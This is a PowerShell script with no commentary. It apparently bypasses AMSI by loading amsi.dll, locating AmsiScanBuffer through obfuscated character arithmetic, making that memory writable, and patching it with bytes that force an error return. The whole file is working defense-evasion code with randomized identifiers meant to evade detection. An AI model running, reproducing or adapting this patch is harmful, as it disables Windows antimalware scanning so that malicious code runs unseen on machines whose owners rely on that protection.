$Myb = @"
using System;
using System.Runtime.InteropServices;
public class Myb {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr kls, string iv8);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Muqc8MsIgyD4Y5, UIntPtr ndCFLKK, uint d0oucn4BRAXwH, out uint Exzc2Zn);
}
"@

Add-Type $Myb

$h80BC = [Myb]::LoadLibrary("$(('âmsì'+'.dll').NoRmALize([chAr]([BYTE]0x46)+[chAR](111+29-29)+[Char]([ByTE]0x72)+[cHAR]([BytE]0x6d)+[cHAr]([byte]0x44)) -replace [cHAr](92+22-22)+[ChaR](112+34-34)+[chaR](123)+[cHar](77*22/22)+[cHAr]([BYtE]0x6e)+[Char]([ByTe]0x7d))")
$yrvf1RJjnoC = [Myb]::GetProcAddress($h80BC, "$([chAr](65*54/54)+[CHar](109)+[cHAR](89+26)+[cHaR](105)+[ChaR]([BYtE]0x53)+[chAR](99+19-19)+[CHaR](97)+[cHAR]([bytE]0x6e)+[CHAR](43+23)+[ChaR]([bytE]0x75)+[cHAr]([BYtE]0x66)+[CHaR](85+17)+[cHAr](101)+[CHAr]([byTE]0x72))")
$p = 0
[Myb]::VirtualProtect($yrvf1RJjnoC, [uint32]5, 0x40, [ref]$p)
$LEEiTHQ9LOC9Krmn7KAK = "0xB8"
$WMd45vjbrqQx29FvG = "0x57"
$m4amM81OK = "0x00"
$ncKTOV6SVX2HrNvf = "0x07"
$xe2zuTfxmFRiH8xRFIj = "0x80"
$gZPqqs8BxHI1GbBC = "0xC3"
$XbPteCR2J5cy8_ = [Byte[]] ($LEEiTHQ9LOC9Krmn7KAK,$WMd45vjbrqQx29FvG,$m4amM81OK,$ncKTOV6SVX2HrNvf,+$xe2zuTfxmFRiH8xRFIj,+$gZPqqs8BxHI1GbBC)
[System.Runtime.InteropServices.Marshal]::Copy($XbPteCR2J5cy8_, 0, $yrvf1RJjnoC, 6)